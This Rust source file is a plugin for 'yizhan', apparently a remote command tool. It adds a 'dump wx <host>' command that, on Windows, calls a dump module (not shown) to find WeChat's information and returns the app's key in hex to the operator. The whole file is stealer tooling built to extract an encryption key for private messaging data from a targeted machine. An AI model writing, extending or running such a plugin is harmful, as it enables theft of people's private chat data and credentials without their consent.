use yizhan_plugin::Plugin;
use yizhan_protocol::command::{UserCommand, UserCommandResult};

#[cfg(windows)]
mod dump;

#[derive(Default)]
pub struct YiZhanDumpWxPlugin {}

impl Plugin for YiZhanDumpWxPlugin {
    fn parse_command(&self, inputs: &[&str]) -> Option<(Option<String>, UserCommand)> {
        match inputs {
            ["dump", "wx", host] => Some((
                Some(host.to_string()),
                UserCommand::PluginCommand("dump".to_string(), "wx".to_string()),
            )),
            _ => None,
        }
    }

    #[cfg(windows)]
    fn execute_command(&self, group_id: &str, content: &str) -> Option<UserCommandResult> {
        if matches!((group_id, content), ("dump", "wx")) {
            use tracing::{info, warn};
            use yizhan_protocol::command::UserCommandResponse;

            info!("Finding wechat info ...");

            Some(match dump::auto_find_wechat_info() {
                Err(err) => {
                    warn!("find wechat info error: {:?}", err);
                    UserCommandResult::Err(format!("find wechat info error: {:?}", err))
                }
                Ok(info) => UserCommandResult::Ok(UserCommandResponse::PluginCommand(format!(
                    "Key: {}\n{:#?}",
                    info.key
                        .iter()
                        .map(|c| format!("{:02X}", c))
                        .collect::<Vec<_>>()
                        .join(""),
                    info
                ))),
            })
        } else {
            None
        }
    }

    #[cfg(not(windows))]
    fn execute_command(&self, _group_id: &str, _content: &str) -> Option<UserCommandResult> {
        None
    }
}
